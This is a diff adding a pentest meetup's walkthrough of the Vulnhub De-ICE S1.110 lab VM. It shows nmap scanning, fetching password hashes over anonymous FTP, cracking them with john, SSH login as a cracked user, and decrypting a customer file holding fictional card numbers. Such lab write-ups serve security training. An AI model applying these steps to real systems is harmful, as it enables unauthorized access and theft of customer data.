@@ -1,0 +1,176 @@
+.. include:: /pentest_links.txt
+
+.. _De-ICE2:
+
+**************
+De-ICE Level 2
+**************
+
+Setup
+=====
+
+This is to document the meetup's efforts responding to the challenge `Vulnhub De-ICE: S1.110 <https://www.vulnhub.com/entry/de-ice-s1110,9/>`_, the second of the Vulnhub De-ICE series. This is a challenge to get sensitive customer information.
+
+Setting up the VM
+-----------------
+
+The VM comes packaged as the live ISO `De-ICE_S1.110.iso <http://hackingdojo.com/downloads/iso/De-ICE_S1.110.iso>`_ running SLAX 5.1.7 (based on Slackware 10.2.0). It uses the fixed IP 192.168.1.110; to force it to use DHCP on your local network, change the 192.168.1.110 network card to be a local network on your VM server (no network access) and add another ethernet interface that will pick up a DHCP address.
+
+Setting up your environment
+---------------------------
+
+.. code-block:: bash
+
+  PT=$HOME/pentest/de-ice2
+  mkdir -p $PT
+  cd $PT
+  # download de-ice2_setup.sh
+  curl --silent --remote-name https://pentest-meetup.appspot.com/html/_downloads/de-ice2_setup.sh
+  # edit as needed; later the recon will give you TARGET IP
+  source de-ice2_setup.sh
+
+The source for :file:`de-ice2_setup.sh` (:download:`de-ice2_setup.sh`) should look something like the following.
+
+.. literalinclude:: de-ice2_setup.sh
+   :language: bash
+
+Reconnaisance
+=============
+
+Network reconnaissance
+----------------------
+
+Start with some standard network reconnaissance looking for the vulnerable host:
+
+.. code-block:: bash
+
+  PT=$HOME/pentest/de-ice2
+  source $PT/de-ice2_setup.sh
+  cd $PT/nmap
+
+  $SUDO nmap -sn -PE -oA nmap_sn $SUBNET
+  $SUDO chown $USER.$USER nmap_sn.*
+  # use the grep-able output to get a list of target hosts
+  grep Up nmap_sn.gnmap | cut -d" " -f2 > $TARGETS
+  # use the xml output to get an html report
+  xsltproc nmap_sn.xml -o nmap_sn.html
+
+Here we know $TARGET and can fill it in $PT/de-ice2_setup.sh and also edit :file:`/etc/hosts` to add "de-ice2.com" (``echo "$TARGET de-ice2.com" | $SUDO tee -a /etc/hosts``).
+
+.. code-block:: bash
+
+  PT=$HOME/pentest/de-ice2
+  source $PT/de-ice2_setup.sh
+  cd $PT/nmap
+
+  $SUDO nmap -A -vv -T3 --max-retries 5 -Pn -oA nmap_A $TARGET
+  $SUDO chown $USER.$USER nmap_A.*
+  xsltproc nmap_A.xml -o nmap_A.html
+
+Running this reveals:
+
+.. code-block:: console
+  :emphasize-lines: 1-3,6,8
+
+  PORT   STATE SERVICE VERSION
+  21/tcp open  ftp     vsftpd 2.0.4
+  | ftp-anon: Anonymous FTP login allowed (FTP code 230)
+  | drwxr-xr-x    7 1000     513           160 Mar 15  2007 download
+  |_drwxrwxrwx    2 0        0              60 Feb 26  2007 incoming [NSE: writeable]
+  22/tcp open  ssh?
+  |_ssh-hostkey: 
+  80/tcp open  http    Apache httpd 2.2.4 ((Unix) mod_ssl/2.2.4 OpenSSL/0.9.8b DAV/2)
+  | http-methods: GET HEAD POST OPTIONS TRACE
+  | Potentially risky methods: TRACE
+  |_See http://nmap.org/nsedoc/scripts/http-methods.html
+  |_http-title: Site doesn't have a title (text/html).
+  OS details: Linux 2.6.13 - 2.6.32
+
+Port 21 reconnaissance
+----------------------
+
+A little reconnaissance on the FTP server first showed :file:`download/etc/shadow` (a dead end):
+
+.. code-block:: console
+  :emphasize-lines: 5,8-
+
+  PT=$HOME/pentest/de-ice2
+  source $PT/de-ice2_setup.sh
+  cd $PT/exploit
+
+  curl --silent --remote-name ftp://de-ice2.com/download/etc/shadow
+  # results in
+  # root:$1$3OF/pWTC$lvhdyl86pAEQcrvepWqpu.
+  echo 'root:$1$3OF/pWTC$lvhdyl86pAEQcrvepWqpu.:12859:0:::::' > shadow.txt
+  /usr/sbin/john --single shadow.txt
+  /usr/sbin/john --show shadow.txt
+  # results in
+  # root:toor
+
+But using the cracked root hash ("toor") to log in failed. Next up is :file:`download/etc/core` which had a dump of the real :file:`/etc/shadow`
+
+.. code-block:: bash
+  :emphasize-lines: 5-
+
+  PT=$HOME/pentest/de-ice2
+  source $PT/de-ice2_setup.sh
+  cd $PT/exploit
+
+  curl --silent --remote-name ftp://de-ice2.com/download/etc/core
+  file core
+  strings core | tail
+  # result
+  # root:$1$aQo/FOTu$rriwTq.pGmN3OhFe75yd30:13574:0
+  # aadams:$1$klZ09iws$fQDiqXfQXBErilgdRyogn.
+  # bbanter:$1$1wY0b2Bt$Q6cLev2TG9eH9iIaTuFKy1
+  # ccoffee:$1$6yf/SuEu$EZ1TWxFMHE0pDXCCMQu70/
+
+
+The Exploit
+===========
+
+We use :program:`john` with the `Ultimate Password List <http://area51archives.com/index.php?title=Ultimate_Password_List>`_ (:file:`pw list 3.txt`) and crack 3 of 4 hashes:
+
+.. code-block:: bash
+  :emphasize-lines: 5-8,11-
+
+  PT=$HOME/pentest/de-ice2
+  source $PT/de-ice2_setup.sh
+  cd $PT/exploit
+
+  echo 'root:$1$aQo/FOTu$rriwTq.pGmN3OhFe75yd30:13574:0:::::' > shadow.txt
+  echo 'aadams:$1$klZ09iws$fQDiqXfQXBErilgdRyogn.:13570:0:99999:7:::' >> shadow.txt
+  echo 'bbanter:$1$1wY0b2Bt$Q6cLev2TG9eH9iIaTuFKy1:13571:0:99999:7:::' >> shadow.txt
+  echo 'ccoffee:$1$6yf/SuEu$EZ1TWxFMHE0pDXCCMQu70/:13574:0:99999:7:::' >> shadow.txt
+
+  # pw list 3.txt finds password
+  /usr/sbin/john --rules --wordlist="pw list 3.txt" shadow.txt
+  /usr/sbin/john --show shadow.txt
+  # results
+  # root:Complexity
+  # bbanter:Zymurgy
+  # ccoffee:Diatomaceous
+
+SSH over with ccoffee (it works), ``su - root``, then decrypt :file:`customer_account.csv.enc`:
+
+.. code-block:: bash
+  :emphasize-lines: 1-
+
+  sshpass -p 'Diatomaceous' ssh ccoffee@de-ice2.com
+  su - root # password Complexity
+  find / -name '*.enc' | grep customer
+  cd /home/root/.save
+  cat copy.sh # add "-d" option to decrypt instead of encrypt
+  openssl enc -d -aes-256-cbc -salt -in customer_account.csv.enc -out customer_account.csv -pass file:/etc/ssl/certs/pw
+  cat customer_account.csv
+  # results in
+  # "CustomerID","CustomerName","CCType","AccountNo","ExpDate","DelMethod"
+  # 1002,"Mozart Exercise Balls Corp.","VISA","2412225132153211","11/09","SHIP"
+  # 1003,"Brahms 4-Hands Pianos","MC","3513151542522415","07/08","SHIP"
+  # 1004,"Strauss Blue River Drinks","MC","2514351522413214","02/08","PICKUP"
+  # 1005,"Beethoven Hearing-Aid Corp.","VISA","5126391235199246","09/09","SHIP"
+  # 1006,"Mendelssohn Wedding Dresses","MC","6147032541326464","01/10","PICKUP"
+  # 1007,"Tchaikovsky Nut Importer and Supplies","VISA","4123214145321524","05/08","SHIP"
+
+And we have the customer data (could FTP it if desired), so are done.
+
